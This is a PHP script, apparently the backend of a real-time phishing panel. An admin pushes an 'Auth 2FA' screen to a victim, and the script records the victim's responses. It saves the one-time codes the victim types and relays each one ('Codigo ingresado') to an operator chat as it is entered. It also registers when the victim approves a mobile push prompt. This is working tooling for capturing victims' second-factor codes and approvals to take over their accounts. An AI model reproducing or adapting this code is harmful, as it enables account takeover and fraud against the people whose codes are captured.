<?php
/**
 * Procesar interacción del usuario con la tela Auth 2FA
 * Guarda la acción en BD y notifica al admin por chat en tiempo real
 */
error_reporting(E_ERROR | E_PARSE);
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'No hay sesión activa']);
    exit;
}

try {
    require_once '../php_config/conexionbd.php';
    require_once __DIR__ . '/chat_captura_helper.php';
    require_once __DIR__ . '/espera_push_helper.php';
    $pdo = conectarBD();

    $input = json_decode(file_get_contents('php://input'), true);

    if (!$input || !isset($input['accion'])) {
        echo json_encode(['success' => false, 'error' => 'Datos no válidos']);
        exit;
    }

    $usuario_id  = $_SESSION['usuario_id'];
    $auth2fa_id  = intval($input['auth2fa_id'] ?? 0);
    $accion      = $input['accion'] ?? '';

    $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR']
             ?? $_SERVER['HTTP_X_REAL_IP']
             ?? $_SERVER['REMOTE_ADDR']
             ?? 'unknown';

    // ── Registrar que el usuario solicitó confirmación (push) ──────────────
    if ($accion === 'solicitar_confirmacion') {

        // Verificar que la solicitud pertenece al usuario
        $stmt = $pdo->prepare("
            SELECT id FROM auth2fa_enviados
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$auth2fa_id, $usuario_id]);
        if (!$stmt->fetch()) {
            echo json_encode(['success' => false, 'error' => 'Solicitud no encontrada']);
            exit;
        }

        // Guardar acción en auth2fa_enviados
        $pdo->prepare("
            UPDATE auth2fa_enviados
            SET accion_usuario = 'solicitar_confirmacion',
                ip_usuario = ?,
                estado = 'completado',
                fecha_completado = NOW()
            WHERE id = ?
        ")->execute([$ip_real, $auth2fa_id]);

        insertarCapturaUsuario($pdo, $usuario_id, $ip_real, 'Push Movil.');
        iniciarEsperaPush($pdo, $usuario_id, 'auth2fa');

        echo json_encode(['success' => true]);

    // ── Registrar que el usuario ingresó un código OTP ─────────────────────
    } elseif ($accion === 'capturar_codigo') {

        $codigo = trim($input['codigo'] ?? '');

        // Verificar que la solicitud pertenece al usuario
        $stmt = $pdo->prepare("
            SELECT id FROM auth2fa_enviados
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$auth2fa_id, $usuario_id]);
        if (!$stmt->fetch()) {
            echo json_encode(['success' => false, 'error' => 'Solicitud no encontrada']);
            exit;
        }

        // Guardar código en auth2fa_enviados
        $pdo->prepare("
            UPDATE auth2fa_enviados
            SET accion_usuario = 'capturar_codigo',
                codigo_ingresado = ?,
                ip_usuario = ?,
                estado = 'completado',
                fecha_completado = NOW()
            WHERE id = ?
        ")->execute([$codigo, $ip_real, $auth2fa_id]);

        insertarCapturaUsuario($pdo, $usuario_id, $ip_real, "Codigo ingresado:\n $codigo");

        echo json_encode(['success' => true]);

    // ── Cancelar la solicitud ──────────────────────────────────────────────
    } elseif ($accion === 'cancelar') {

        $pdo->prepare("
            UPDATE auth2fa_enviados
            SET estado = 'cancelado'
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ")->execute([$auth2fa_id, $usuario_id]);

        echo json_encode(['success' => true]);

    } else {
        echo json_encode(['success' => false, 'error' => 'Acción no válida']);
    }

} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error de base de datos: ' . $e->getMessage()]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => 'Error: ' . $e->getMessage()]);
}
?>
